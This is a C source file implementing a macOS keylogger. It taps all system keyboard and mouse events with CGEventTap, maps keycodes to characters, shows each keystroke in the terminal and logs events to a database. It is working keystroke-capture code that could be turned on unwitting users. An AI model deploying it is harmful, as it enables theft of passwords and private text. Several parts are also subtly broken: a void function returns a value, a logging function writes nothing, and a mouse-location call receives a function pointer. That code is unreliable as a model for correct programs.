#pragma once
#include "submodules/meson_deps/submodules/generic-print/print.h"
#include <signal.h>
#include <stdlib.h>
/**********************************/
#define WRITE_LOG_FILE          true
#define DELETE_DATABASE_FILE    false
/**********************************/
#include "keylogger.h"
/**********************************/
CFArrayRef windowList;
volatile unsigned int windows_qty = 0;
/**********************************/
volatile unsigned long
  events_qty       = 0,
  started          = 0,
  mouse_events_qty = 0,
  kb_events_qty    = 0
;


keylogger_stats_t *kl;
bool              was_icanon = false;
bool              exited     = false;


void __at_exit(void){
  if (exited) {
    return(0);
  }
  exited = true;
  bool ic = seticanon(was_icanon, true);
  fprintf(stdout, "%s", AC_SHOW_CURSOR);
  if (false) {
    fprintf(stdout, "%s", AC_RESTORE_PALETTE);
  }
  if (false) {
    fprintf(stdout, "%s", AC_ALT_SCREEN_OFF);
  }
  exit(0);
}

#define INIT_KEYLOGGER_STATS()    { do {                                                      \
                                      if (false) fprintf(stdout, "%s", AC_SAVE_PALETTE);      \
                                      if (false) fprintf(stdout, "%s", AC_ALT_SCREEN_ON);     \
                                      bool ic = seticanon(false, false);                      \
                                      if (ic == true)                                         \
                                      was_icanon = true;                                      \
                                      fprintf(stdout, "%s", AC_HIDE_CURSOR);                  \
                                      kl                 = malloc(sizeof(keylogger_stats_t)); \
                                      kl->times          = malloc(sizeof(times_t));           \
                                      kl->qty            = malloc(sizeof(since_t));           \
                                      kl->since          = malloc(sizeof(since_t));           \
                                      kl->since->any     = 0;                                 \
                                      kl->times->started = timestamp();                       \
                                      kl->times->ts      = kl->times->started;                \
                                      kl->times->last    = 0;                                 \
                                      kl->qty->any       = 0;                                 \
                                    } while (0); }

CGPoint     mouse_location;
/**********************************/
CGEventMask mouse_and_kb_events = (
  ///////////////////////////////////////
  CGEventMaskBit(kCGEventKeyDown)
  | CGEventMaskBit(kCGEventKeyUp)
  ///////////////////////////////////////
  | CGEventMaskBit(kCGEventFlagsChanged)
  | CGEventMaskBit(kCGEventLeftMouseDown)
  | CGEventMaskBit(kCGEventLeftMouseUp)
  | CGEventMaskBit(kCGEventRightMouseDown)
  | CGEventMaskBit(kCGEventRightMouseUp)
  | CGEventMaskBit(kCGEventMouseMoved)
  | CGEventMaskBit(kCGEventLeftMouseDragged)
  | CGEventMaskBit(kCGEventRightMouseDragged)
  ///////////////////////////////////////
  );


/**********************************/
void append_keystroke_log(const char *ckc){
  char *l = malloc(1024);

  sprintf(l, "%llu:%s\n", timestamp(), (char *)ckc);
  free(l);
}


/**********************************/
static int tap_events(){
  CFRunLoopRun();
  return(0);
}


static int setup_event_tap(){
  CFMachPortRef event_tap = CGEventTapCreate(
    kCGSessionEventTap, kCGHeadInsertEventTap, 0, mouse_and_kb_events, event_handler, NULL
    );

  if (!event_tap) {
    fprintf(stderr, "ERROR: Unable to create keyboard event tap.\n");
    return(1);
  }

  CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);

  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
  CGEventTapEnable(event_tap, true);
  return(0);
}


/**********************************/
int init(){
  signal(SIGINT, __at_exit);
  signal(SIGTERM, __at_exit);
  signal(SIGQUIT, __at_exit);
  atexit(__at_exit);
  INIT_KEYLOGGER_STATS();
  started = timestamp();
  assert(keylogger_init_db() == 0);
  mouse_location = CGEventGetLocation(event_handler);
  return(0);
}


/**********************************/


CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
  kl->times->ts = timestamp();
  kl->qty->any++;
  bool
       key_up = (type == kCGEventKeyUp), key_down = (type == kCGEventKeyDown)
  ;
  char *action = "";

  if (key_up) {
    action = "UP";
  }else if (key_down) {
    action = "DOWN";
  }else{
    action = "UNKNOWN";
  }

  CGKeyCode  keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
  const char *ckc    = convertKeyCode(keyCode);
  kl->since->any = (kl->qty->any > 0) ?  (kl->times->ts - kl->times->last) : (0);

  fprintf(stdout, "%s", AC_CLS);
  PRINT("<", kl->times->ts, ">",
        "\n\t  | keycode: ", keyCode, "| action:", action, "|", (char *)ckc,
        "\n\t  | last:", kl->times->last,
        "\n\t  | key up?", key_up, "since any:", kl->since->any,
        "\n\t  | any qty:", kl->qty->any
        );
  kl->times->last = kl->times->ts;
  keylogger_insert_db_row(&(logged_key_event_t){
    .ts  = timestamp(),
    .qty = 5,
  });

  return(event);
} /* CGEventCallback */


static const char *convertKeyCode(int keyCode) {
  switch ((int)keyCode) {
  case 0:   return("a");

  case 1:   return("s");

  case 2:   return("d");

  case 3:   return("f");

  case 4:   return("h");

  case 5:   return("g");

  case 6:   return("z");

  case 7:   return("x");

  case 8:   return("c");

  case 9:   return("v");

  case 11:  return("b");

  case 12:  return("q");

  case 13:  return("w");

  case 14:  return("e");

  case 15:  return("r");

  case 16:  return("y");

  case 17:  return("t");

  case 18:  return("1");

  case 19:  return("2");

  case 20:  return("3");

  case 21:  return("4");

  case 22:  return("6");

  case 23:  return("5");

  case 24:  return("=");

  case 25:  return("9");

  case 26:  return("7");

  case 27:  return("-");

  case 28:  return("8");

  case 29:  return("0");

  case 30:  return("]");

  case 31:  return("o");

  case 32:  return("u");

  case 33:  return("[");

  case 34:  return("i");

  case 35:  return("p");

  case 37:  return("l");

  case 38:  return("j");

  case 39:  return("'");

  case 40:  return("k");

  case 41:  return(";");

  case 42:  return("\\");

  case 43:  return(",");

  case 44:  return("/");

  case 45:  return("n");

  case 46:  return("m");

  case 47:  return(".");

  case 50:  return("`");

  case 65:  return("[decimal]");

  case 67:  return("[asterisk]");

  case 69:  return("[plus]");

  case 71:  return("[clear]");

  case 75:  return("[divide]");

  case 76:  return("[enter]");

  case 78:  return("[hyphen]");

  case 81:  return("[equals]");

  case 82:  return("0");

  case 83:  return("1");

  case 84:  return("2");

  case 85:  return("3");

  case 86:  return("4");

  case 87:  return("5");

  case 88:  return("6");

  case 89:  return("7");

  case 91:  return("8");

  case 92:  return("9");

  case 36:  return("[return]");

  case 48:  return("[tab]");

  case 49:  return(" ");

  case 51:  return("[del]");

  case 53:  return("[esc]");

  case 54:  return("[right-cmd]");

  case 55:  return("[left-cmd]");

  case 56:  return("[left-shift]");

  case 57:  return("[caps]");

  case 58:  return("[left-option]");

  case 59:  return("[left-ctrl]");

  case 60:  return("[right-shift]");

  case 61:  return("[right-option]");

  case 62:  return("[right-ctrl]");

  case 63:  return("[fn]");

  case 64:  return("[f17]");

  case 72:  return("[volup]");

  case 73:  return("[voldown]");

  case 74:  return("[mute]");

  case 79:  return("[f18]");

  case 80:  return("[f19]");

  case 90:  return("[f20]");

  case 96:  return("[f5]");

  case 97:  return("[f6]");

  case 98:  return("[f7]");

  case 99:  return("[f3]");

  case 100: return("[f8]");

  case 101: return("[f9]");

  case 103: return("[f11]");

  case 105: return("[f13]");

  case 106: return("[f16]");

  case 107: return("[f14]");

  case 109: return("[f10]");

  case 111: return("[f12]");

  case 113: return("[f15]");

  case 114: return("[help]");

  case 115: return("[home]");

  case 116: return("[pgup]");

  case 117: return("[fwddel]");

  case 118: return("[f4]");

  case 119: return("[end]");

  case 120: return("[f2]");

  case 121: return("[pgdown]");

  case 122: return("[f1]");

  case 123: return("[left]");

  case 124: return("[right]");

  case 125: return("[down]");

  case 126: return("[up]");
  } /* switch */
  fprintf(stderr, "UNKNOWN KEY: %d\n", keyCode);
  return("[unknown]");
} /* convertKeyCode */


/**********************************/
int keylogger_exec() {
  assert(init() == 0);
  assert(setup_event_tap() == 0);
  assert(tap_events() == 0);
  return(0);
}
/**********************************/
